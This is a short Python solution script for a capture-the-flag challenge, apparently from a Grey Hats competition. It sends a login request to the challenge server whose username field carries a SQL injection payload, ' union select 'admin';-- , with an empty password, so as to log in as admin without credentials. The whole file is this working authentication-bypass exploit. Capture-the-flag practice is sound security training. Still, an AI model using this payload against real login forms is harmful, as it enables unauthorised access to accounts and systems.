HOST = "challs.nusgreyhats.org"
# HOST = "localhost"
# Update port as needed
PORT = 32901

# Put the solution script here
import requests
print(requests.post(f"http://{HOST}:{PORT}/login", data={"username":"' union select 'admin';-- ", "password": ""}).json())